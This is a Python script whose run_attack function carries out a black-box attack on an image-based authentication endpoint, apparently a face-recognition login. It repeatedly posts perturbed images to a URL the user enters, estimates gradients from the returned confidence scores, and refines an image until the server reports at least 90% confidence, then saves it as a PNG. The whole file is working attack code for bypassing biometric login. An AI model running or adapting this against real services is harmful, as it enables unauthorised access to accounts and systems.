import requests
import torch
import torch.nn.functional as F
import torchvision.transforms as T
from   torchvision.utils import save_image
import torchvision.io as tvio
import numpy as np
import io
from   PIL import Image
from   concurrent.futures import ThreadPoolExecutor

# http://localhost:8000/api/v1/auth/Admin

def run_attack(args):

    if not args.output:
        args.output = "tensor.png"

    # Tool settings
    SERVER_URL = input("Authentication url to attack: ")
    MAX_WORKERS = 10            # Threading
    FD_SAMPLES  = MAX_WORKERS   # Sample average

    # Adjustable reverse engineering parameter
    EMBED_SIZE  = 512       # Embedding dimensions
    SEND_SIZE   = 160       # Target send dimensions
    LR          = 0.15      # Learning rate (Alpha)
    BETA        = 0.98      # Momentum coefficient
    SIGMA       = 0.07      # Explore rate
    DECAY       = 0.50      # Learning & explore decay (breaking)
    STEPS       = 3000      # How many steps to train the inversion model
    CUT_LOSS    = -0.0006   # Reduce learning rate threshold
    EARLY_STOP  = 0.90      # Early stop % 

    # --------------------------- #

    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    
    # Model data
    generated = torch.rand(1, 3, EMBED_SIZE, EMBED_SIZE, device=device)
    velocity = torch.zeros_like(generated)
    current_score = 0.0
    high_score = 0.0
    lr = LR
    sigma = SIGMA
    min_lr = LR / 10
    min_sigma = SIGMA / 10

    # Restore point
    best_state = None

    def tensor_to_png_bytes(img_tensor):
        img = img_tensor.squeeze().detach()
        img = (img * 255).clamp(0,255).to(torch.uint8)

        # encode_png still requires CPU, but skips PIL overhead
        img = img.cpu()
        return tvio.encode_png(img).numpy().tobytes()

    def query_server(img_tensor):
        resize_to_model = T.Resize((160, 160))
        img_tensor = resize_to_model(img_tensor.clamp(0, 1))
        img_bytes = tensor_to_png_bytes(img_tensor)
        files = {"file": ("image.png", img_bytes, "image/png")}
        response = requests.post(SERVER_URL, files=files)
        return response.json()["confidence"]

    def evaluate_perturbation(_):
        u = torch.randn_like(generated)
        perturbed = (generated + sigma * u).clamp(0, 1)
        score = query_server(perturbed)
        return u, score

    print("\033[?25l* Waiting for data...\r", end="")

    for step in range(STEPS):
        grad_estimate = torch.zeros_like(generated)
        noise_list = []
        score_list = []

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(evaluate_perturbation, i) for i in range(FD_SAMPLES)]
            for future in futures:
                u, score = future.result()
                noise_list.append(u)
                score_list.append(score)

        score_mean = np.mean(score_list)

        # variance reduction (very important)
        for u, score in zip(noise_list, score_list):
            grad_estimate += (score - score_mean) * u

        grad_estimate /= (FD_SAMPLES * sigma)

        velocity = BETA * velocity + grad_estimate
        generated = (generated + lr * velocity).clamp(0, 1)

        new_score = query_server(generated)
        loss_delta = high_score - new_score

        if new_score > high_score:
            high_score = new_score
            best_state = {
                "generated": generated.detach().clone(),
                "best_score": high_score if high_score > high_score else high_score
            }

        if loss_delta > CUT_LOSS:
            # Restore data
            print("\nRegression detected! Restoring highest score snopshot...\r", end="")
            CUT_LOSS *= 0.75
            generated = best_state["generated"].clone()
            velocity = torch.zeros_like(generated)
            high_score = 0.0
            # Re-calculate generation
            lr = max(min_lr, lr * DECAY)
            sigma = max(min_sigma, sigma * DECAY)
            grad_estimate = torch.zeros_like(generated)
            velocity = BETA * velocity + grad_estimate
            generated = (generated + lr * velocity).clamp(0, 1)

        if high_score == 0.0:
            print("\033[n\x1b[2K* Waiting for data...\r", end="")
        else:
            vel_mag = torch.norm(velocity)
            print(f"\033[n\x1b[2K* [{step + 1}/{STEPS}]: Accuracy {high_score * 100:.3f}% (α={lr:.6f}, ‖v‖₂={vel_mag.item():.6f}, σ={sigma:.6f})", end="\r\n")
            print(f"\033[n\x1b[2K< loss delta: {loss_delta:.6f} | best {best_state["best_score"] * 100:.3f}% >\r\033[F", end="")

        current_score = score
        # ---- EARLY STOP ----
        if current_score >= EARLY_STOP:
            print(f"\nEarly stopping at step {step} — reached {current_score:.4f} confidence.")
            break

    print("\033[?25h")

    final_high = generated
    save_image(final_high, args.output)

    print("Finished.")
